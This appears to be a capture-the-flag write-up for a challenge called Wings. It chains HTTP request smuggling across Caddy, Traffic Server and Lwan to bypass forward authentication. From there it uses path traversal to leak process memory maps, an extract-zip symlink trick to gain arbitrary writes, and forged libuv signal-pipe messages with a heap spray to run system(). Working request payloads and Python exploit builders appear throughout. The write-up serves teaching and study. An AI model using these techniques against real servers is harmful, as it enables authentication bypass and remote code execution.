---
title: "Crossing layers: From HTTP state confusion to command execution through a forged callback"
cardTitle: "Wings: Crossing layers"
description: "Wings connects HTTP state confusion, a ZIP write primitive, and a forged libuv callback under PIE and ASLR."
date: 2026-11-21T00:01:00Z
category: CTF
event: Wings
cover: wings
tags: [web, http, nodejs, libuv, aslr, zip]
draft: false
---

# Crossing layers: From HTTP state confusion to command execution through a forged callback

The Basic Auth prompt is the first thing the instance shows, so that was where I began. The source bundle rules out a credential leak almost immediately: neither password is stored anywhere, and both are generated when the container starts. The useful way into the challenge is to stop treating it as one web application and trace a request across every process it touches.

Wings has five processes in one container:

~~~text
player
  |
  | TCP 8080
  v
Caddy
  |                         |
  | media and auth checks   | accepted application request
  v                         v
Apache Traffic Server      Showrunner / Node.js :3000
  |
  v
Lwan :8082

Python http.server :8000 -> /flag/flag.txt
                         loopback only, root-owned
~~~

Five processes are a lot for a small web challenge. Here, each hop matters. Caddy decides whether a request reaches Node, ATS manages the reusable origin connection, and Lwan makes the body-handling decision that opens the first stage.

The second half follows the signal-pipe technique from [Why Code Security Matters - Even in Hardened Environments](https://www.sonarsource.com/blog/why-code-security-matters-even-in-hardened-environments/). In the SonarSource research, the official Node executable was built without PIE. ASLR still randomized the shared libraries, heap, and stack, while addresses inside the Node image stayed fixed. That gave the exploit a stable area in which to search for data that could serve as a fake signal handle and eventually support a ROP chain. Wings keeps the same libuv signal path while taking away that stability: Alpine's Node 24.21.0 binary is PIE, so its image receives a new base address with every process.

`readelf` confirms the difference:

~~~text
$ readelf -h /usr/local/bin/node | grep Type
Type: DYN (Position-Independent Executable file)
~~~

The Node image, musl, heap, and stack all move under ASLR. Solving this version requires recovering both useful addresses at runtime. We leak the live mappings to locate musl, place thousands of complete fake uv_signal_t objects in a Multer buffer, and leak the maps again while that buffer is still allocated to find it on the heap. The ZIP write primitive carries raw bytes, so the UTF-8 restriction from the original research does not apply. Once both addresses are known, the forged libuv callback can call musl's system function directly.

## Following a request through the gateway

The Caddyfile gives us the first useful map of the application. It splits traffic into two paths:

~~~caddyfile
:8080 {
    handle /media/* {
        uri strip_prefix /media
        reverse_proxy 127.0.0.1:8081 {
            header_up Host local
            header_up Authorization "Basic {$MEDIA_AUTH}"
            transport http {
                keepalive 100ms
            }
        }
    }

    handle {
        forward_auth 127.0.0.1:8081 {
            uri /backstage/index.html
            header_up Host local
            transport http {
                keepalive off
            }
        }
        reverse_proxy 127.0.0.1:3000
    }
}
~~~

Requests under /media/ go to Apache Traffic Server, then Lwan. Caddy supplies the private media credential itself. Any other path first causes a separate request for /backstage/index.html. Caddy sends the original request to Showrunner only when that authorization request returns a 2xx response.

The startup script creates different random passwords for the two Lwan file trees:

~~~sh
media_password=$(openssl rand -hex 24)
printf 'operator = %s\n' "$media_password" > /etc/lwan/media.htpasswd
printf 'operator = %s\n' "$(openssl rand -hex 24)" > /etc/lwan/backstage.htpasswd
~~~

Neither password can be recovered from the player files. The useful state lives at the ATS-to-Lwan boundary, where the two programs disagree about what happened to a GET body.

ATS is configured with one incoming connection per client and a shared locked origin pool:

~~~yaml
net:
  per_client:
    max_connections_in: 1
http:
  auth_server_session_private: 2
  cache:
    http: 0
  server_session_sharing:
    pool: global_locked
~~~

The global pool allows an idle Lwan connection to be used by a later ATS transaction. In ATS 10.2, value 2 for auth_server_session_private does not make a session private merely because the request has an Authorization header. Only Proxy-Authorization or WWW-Authenticate triggers that rule, so the media connection can return to the pool.

## The Lwan body accounting mismatch

Only a few lines in Lwan explain the mismatch. The [pinned commit](https://github.com/lpereira/lwan/blob/b70ebde92cb38eac5b1961d8c7259d964648fdbe/src/lib/lwan-request.c), b70ebde92cb38eac5b1961d8c7259d964648fdbe, stores method properties in a bit mask. Bit 3 means that a request method has a body:

~~~c
#define FOR_EACH_REQUEST_METHOD(X)                                      \
    X(GET,  get,  (1 << 0), ...)                                        \
    X(POST, post, (1 << 3 | 1 << 1 | 1 << 0), ...)                       \
    X(PUT,  put,  (1 << 3 | 1 << 2 | 1 << 0), ...)

static inline bool request_has_body(const struct lwan_request *request) {
    return lwan_request_get_method(request) & (1 << 3);
}
~~~

GET does not carry bit 3. That decision reaches prepare_for_response:

~~~c
if (UNLIKELY(request_has_body(request)))
    return maybe_read_body_data(url_map, request);

return HTTP_OK;
~~~

Lwan can parse a positive Content-Length on a GET, but this branch never asks the body reader to consume those bytes. Its file handler returns the requested page as soon as the headers are parsed. The unread bytes remain in the connection buffer and are interpreted as another HTTP request.

The priming request is small enough to inspect by hand. Its body is exactly 58 bytes and ends after the blank line:

~~~http
GET /media/index.html HTTP/1.1
Host: TARGET
Content-Length: 58

POST /receipt HTTP/1.1
Host: local
Content-Length: 1

~~~

CRLF line endings are required. Caddy removes /media, adds the valid media credential, and forwards the request through ATS. Lwan returns /index.html without consuming the declared GET body. It then parses the body as POST /receipt.

The receipt endpoint is an ordinary Lwan Lua route:

~~~text
lua /receipt {
    script = '''function handle_post_root(req)
        req:set_keep_alive(false)
        req:set_response('ok')
    end'''
}
~~~

Lwan's Lua module declares HANDLER_EXPECTS_BODY_DATA. POST also has the body bit, so read_body_data runs this time. It sees Content-Length: 1 and zero available bytes, then waits.

At this point, the same socket has two different meanings depending on which side we ask:

~~~text
ATS:   the media GET completed; this origin socket may be pooled
Lwan:  POST /receipt parsed; still waiting for one body byte
~~~

The timing detail matters. Wait roughly 150 ms after receiving the media response, then request a protected Showrunner path. Caddy performs its forward_auth request:

~~~http
GET /backstage/index.html HTTP/1.1
Host: local
...
~~~

ATS reuses the waiting Lwan socket. The first byte of that request, G, becomes the one-byte body of POST /receipt. The Lua handler replies with 200 ok and closes the connection. ATS associates that response with the transaction it just sent, which is Caddy's authorization check. Caddy sees a successful auth response and forwards the original protected request to Node.

This is the dangling-byte step. The missing byte removes the normal response race. If POST /receipt is complete during the media request, its response is produced too early and the connection closes before forward_auth can use it. A full smuggled request to the file tree also fails because it has no valid Lwan credential.

Caddy keeps its media-side ATS connection for 100 ms. ATS accepts one connection from that client, so firing the protected request immediately can fail before it reaches the poisoned origin socket. A delay around 150 ms gives Caddy time to release that connection while leaving Lwan blocked on the missing byte. In a solver, retry the prime when the protected request returns 401 or 502.

Every protected request needs this prime, including POST bodies and the export requests used later. Caddy's authorization subrequest is separate from the original request, so the original ZIP body reaches Showrunner unchanged after the 200 response.

No parser is replaced or patched here. The state mismatch comes from the stock Caddy proxy behavior, ATS connection reuse, and the pinned Lwan method flags.

## Checking the container boundary

Reaching Showrunner only completes the first stage. I next checked whether an application feature could read the flag directly. The container starts the flag service as root, then drops the Node application to UID 1000:

~~~sh
/usr/bin/python3 -m http.server 8000 --bind 127.0.0.1 --directory /flag &
...
exec su-exec node node server.js
~~~

The Dockerfile applies the matching permissions:

~~~dockerfile
chown node:node /data /app/config.json /app/sheets-config.json
chmod 700 /flag
chmod 600 /flag/flag.txt
~~~

Node can write under /data. The application code, dependencies, gateway configuration, and /flag remain root-owned. Reading /flag/flag.txt through the application therefore returns EACCES. The flag service is reachable only on 127.0.0.1:8000, and the application's configurable QLab connection emits SLIP-framed OSC rather than HTTP. Getting through Basic Auth is not enough; we need the Node process to execute a command that speaks to the local HTTP server.

## Turning history export into a memory-map leak

History import and export provide the first useful disclosure in the Node service. Showrunner imports a history ZIP into memory:

~~~js
const importUpload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 1024 * 1024 * 1024 },
});

router.post('/import', importUpload.single('archive'), async (req, res) => {
  fs.writeFileSync(zipPath, req.file.buffer);
  await extractZip(zipPath, { dir: extractDir });
  const historyJson = JSON.parse(fs.readFileSync(historyPath, 'utf8'));
  const idMap = importHistory(db, historyJson);
  // ...
});
~~~

importHistory assigns a new show ID but copies each photo object into the database:

~~~js
for (const photo of entry.photos || []) {
  db.data.photos.push({
    ...photo,
    id: nextId(db.data.photos),
    show_id: newId
  });
}
~~~

The filename survives unchanged. The export route later uses that value as a filesystem path:

~~~js
for (const show of shows) {
  const folder = photoFolderName(show);
  for (const { filename } of show.photos) {
    archive.file(
      path.join(getPhotosDir(), folder, filename),
      { name: 'photos/' + folder + '/' + filename }
    );
  }
}
~~~

Import the following history.json:

~~~json
[
  {
    "id": 101,
    "started_at": "2026-09-29T12:00:00.000Z",
    "photos": [
      {
        "filename": "../../../proc/self/maps",
        "uploaded_at": "2026-09-29T12:01:00.000Z"
      }
    ]
  }
]
~~~

The normal photo path starts under /data/photos/<show-folder>/. Three parent components reach the filesystem root, and archiver reads /proc/self/maps into the exported ZIP. Filesystem permissions still protect the flag. The exported process information is exactly what we need later. Extract the member whose name ends in /proc/self/maps.

The map discloses the randomized base of musl. Alpine uses /lib/ld-musl-x86_64.so.1 as both its dynamic loader and C library. The pinned image exports system at offset 0x5cf02:

~~~text
$ readelf -Ws /lib/ld-musl-x86_64.so.1 | grep system
982: 000000000005cf02 574 FUNC GLOBAL DEFAULT 11 system
~~~

Find the offset-zero mapping for that file and calculate:

~~~python
libc_base = int(mapping_start, 16)
system_address = libc_base + 0x5cf02
~~~

This answers the first ASLR question: where does the callback function live in this process? The address changes on each instance, so a hardcoded callback cannot work.

## Getting an arbitrary binary write from extract-zip

With the callback address known, the next requirement is an arbitrary binary write. Showrunner pins [extract-zip 2.0.1](https://github.com/max-mapper/extract-zip/blob/v2.0.1/index.js). The extractor checks that each entry's parent directory resolves inside its temporary extraction folder. It does not resolve the final path component before opening it:

~~~js
if (symlink) {
  await fs.symlink(link, dest)
} else {
  await pipeline(readStream, createWriteStream(dest, { mode: procMode }))
}
~~~

Create two entries with the same name. The first is a Unix symlink named pivot.bin whose contents are an absolute target. The second is a regular file also named pivot.bin. When the regular entry is processed, createWriteStream opens the existing path and follows the symlink. The parent directory still passes the realpath containment check because pivot.bin itself is never resolved during that check.

This helper produces the required archive:

~~~python
def indirect_zip(target, payload):
    output = io.BytesIO()
    with warnings.catch_warnings():
        warnings.simplefilter("ignore", UserWarning)
        with ZipFile(output, "w", ZIP_STORED) as archive:
            archive.writestr("history.json", "[]")

            link = ZipInfo("pivot.bin")
            link.create_system = 3
            link.external_attr = (stat.S_IFLNK | 0o777) << 16
            archive.writestr(link, target)

            regular = ZipInfo("pivot.bin")
            regular.create_system = 3
            regular.external_attr = (stat.S_IFREG | 0o644) << 16
            archive.writestr(regular, payload)
    return output.getvalue()
~~~

It is worth proving the write against a harmless target first. Use /data/r, then query /api/shows after importing the map record because Showrunner replaces the history ID with a new ID. Its photo folder is derived from the timestamp and that assigned ID.

~~~python
photo_dir = f"/data/photos/20260929-120000-{show_id}"
script = f"""#!/bin/sh
set -e
mkdir -p {photo_dir}
wget -q -O {photo_dir}/flag.txt http://127.0.0.1:8000/flag.txt
""".encode()

upload_zip("script.zip", indirect_zip("/data/r", script))
~~~

At this point /data/r is only a file. The same primitive cannot overwrite /app/server.js or the files under /flag because the kernel applies the Node user's permissions after following the symlink. We now need a writable destination that turns bytes into control flow, which is where the libuv pipe becomes useful.

## How the signal pipe reaches a function pointer

The pinned Node build contains [libuv 1.52.1](https://github.com/libuv/libuv/blob/v1.52.1/src/unix/signal.c). On Unix, libuv creates a nonblocking pipe for signal delivery:

~~~c
err = uv__make_pipe(pipefd, UV_NONBLOCK_PIPE);
uv__io_init_start(loop, &loop->signal_io_watcher,
                  UV__SIGNAL_EVENT, pipefd[0], POLLIN);
~~~

The operating-system signal handler writes a small message to the pipe. libuv defines that message as:

~~~c
typedef struct {
  uv_signal_t* handle;
  int signum;
} uv__signal_msg_t;
~~~

On x86-64 the structure occupies 16 bytes: an eight-byte pointer, a four-byte integer, and four bytes of alignment padding. The event loop reads those messages in uv__signal_event:

~~~c
handle = msg->handle;
if (msg->signum == handle->signum)
  handle->signal_cb(handle, handle->signum);
~~~

The event-loop code assumes every message came from libuv's own signal handler. A direct 16-byte write to the pipe breaks that assumption: msg->handle can point anywhere readable, and a matching signum reaches a function pointer stored inside the referenced uv_signal_t.

The relevant public layout is:

~~~c
struct uv_signal_s {
  UV_HANDLE_FIELDS
  uv_signal_cb signal_cb;
  int signum;
  UV_SIGNAL_PRIVATE_FIELDS
};
~~~

In the pinned x86-64 build, signal_cb is at offset 96 and signum is at offset 104. The full writable object area used by the solver is 152 bytes. The lab's native Node process has the signal-pipe write end at file descriptor 15, which can be confirmed in a local x86-64 build through /proc/<node-pid>/fd.

Opening /proc/self/fd/15 does not modify procfs data. The path resolves to the underlying pipe object, and the write is handled by pipefs. The Node user owns that descriptor, so extract-zip can open it through the duplicate-entry symlink.

## Replacing the non-PIE shortcut with a live heap object

The SonarSource technique begins with a write-only primitive. It uses stable non-PIE Node mappings to find an existing fake-handle candidate that references a stack-pivot gadget. Its final ROP bytes also have to survive UTF-8 encoding.

In Wings, every useful region is randomized. The map leak lets us choose a simpler callback, provided we can locate controlled writable memory while it is still alive.

Multer's memory storage pipes the upload into concat-stream:

~~~js
file.stream.pipe(concat({ encoding: 'buffer' }, function (data) {
  cb(null, {
    buffer: data,
    size: data.length
  })
}))
~~~

req.file.buffer remains referenced for the duration of the import handler. Showrunner writes it to a temporary ZIP, then extract-zip processes the entries before the request finishes. That lifetime is the opening we need. A large stored member gives us controlled bytes in the Buffer, while thousands of tiny trailing entries keep extraction busy long enough to make another export request and leak /proc/self/maps.

Create a zero-filled 300,000-byte spray.bin. Place a fake uv_signal_t every 64 bytes. Each object contains:

* sh /data/r followed by a null byte at offset 0
* the leaked system address at offset 96
* signal number 12 at offset 104

~~~python
COMMAND = b"sh /data/r"
FAKE_SIZE = 152
spacing = 64

spray = bytearray(300_000)
for absolute in range(4096 - 16,
                      data_start + len(spray) - FAKE_SIZE + 1,
                      spacing):
    if absolute < data_start:
        continue
    offset = absolute - data_start
    spray[offset:offset + len(COMMAND)] = COMMAND
    spray[offset + len(COMMAND)] = 0
    struct.pack_into("<Q", spray, offset + 96, system_address)
    struct.pack_into("<i", spray, offset + 104, 12)
~~~

data_start is the byte offset of spray.bin's stored data inside the ZIP. With history.json first, the first fake object begins at absolute ZIP offset 4080, then repeats every 64 bytes.

Why can system be used as a uv_signal_cb? On x86-64 System V, the first function argument is passed in RDI. libuv calls signal_cb(handle, signum), so RDI contains the fake handle address. system expects its command pointer in the same register. Since the fake handle starts with sh /data/r and a null terminator, the mismatched callback is effectively:

~~~c
system((char *) handle);
~~~

The remaining fake fields are zero. That keeps the closing and one-shot flags clear, and the sprayed memory is writable when libuv increments dispatched_signals after the callback.

Add padding.bin and 5,000 one-byte entries named s/0000 through s/4999. Adjust the padding until the ZIP is exactly 1,048,000 bytes:

~~~python
def build_spray_zip(padding_length):
    output = io.BytesIO()
    with ZipFile(output, "w", ZIP_STORED) as archive:
        archive.writestr("history.json", "[]")
        archive.writestr("spray.bin", spray)
        archive.writestr("padding.bin", b"P" * padding_length)
        for i in range(5000):
            archive.writestr(f"s/{i:04d}", b"x")
    return output
~~~

The complete multipart request is 1,048,177 bytes, which stays below the hosted 1,048,576-byte request limit.

## Locating the upload buffer under ASLR

The callback address is now known. The Buffer address is still missing. Leak /proc/self/maps once before the spray and record large anonymous writable mappings. Start the spray import in another HTTP connection. After its body has been sent and while extract-zip is walking the small entries, export the maps again.

The underlying allocation is one MiB. Depending on allocator state, it may appear as its own mapping or at the end of a larger anonymous mapping. For every new or resized rw-p anonymous mapping between one MiB and 128 MiB, calculate:

~~~python
buffer_start = mapping_end - 1_048_576
~~~

Select a candidate only when the before-and-during comparison leaves one unambiguous mapping. An exact new one-MiB mapping is the strongest case. If several candidates remain, let the upload finish and repeat with a fresh spray rather than guessing an old allocation.

Choose an address well inside the controlled region:

~~~python
target = buffer_start + 65_536 + 256
~~~

The mapping is page-aligned, while fake objects start at one of four possible 16-byte positions modulo 64. Sending four adjacent candidate pointers covers those positions:

~~~python
message = b"".join(
    struct.pack("<Qi", target + i * 16, 12) + bytes(4)
    for i in range(4)
)
~~~

This second leak handles the heap side of PIE and ASLR. The earlier musl leak handled the callback address. No stable address from the Node executable is used.

## Triggering libuv and collecting the flag

All the pieces now need to be live at the same time: the uploaded Buffer, the leaked addresses, and the script under /data/r. Build one more duplicate-entry archive:

~~~python
writer_zip = indirect_zip("/proc/self/fd/15", message)
upload_zip("writer.zip", writer_zip)
~~~

extract-zip follows pivot.bin to the signal-pipe descriptor and writes the four 16-byte records. uv__signal_event reads them as uv__signal_msg_t values. Three pointers land between sprayed handles. One lands on the correct 64-byte phase, where these checks line up:

~~~text
msg->handle             -> sprayed fake uv_signal_t
msg->signum             -> 12
handle->signum          -> 12
handle->signal_cb       -> musl system
bytes at handle address -> "sh /data/r\0"
~~~

libuv calls the forged callback, which runs /data/r as the Node user. That script can reach the root-owned flag service over loopback even though it still cannot open /flag/flag.txt directly. It saves the response in the imported show's photo directory.

Prime the media route again and request:

~~~text
/photos/<show-id>/flag.txt
~~~

> Note: If the buffer mapping is ambiguous or the upload finishes before the maps export, repeat the spray. Redo the address calculations for each instance and each new process because both the musl base and heap allocation are randomized.
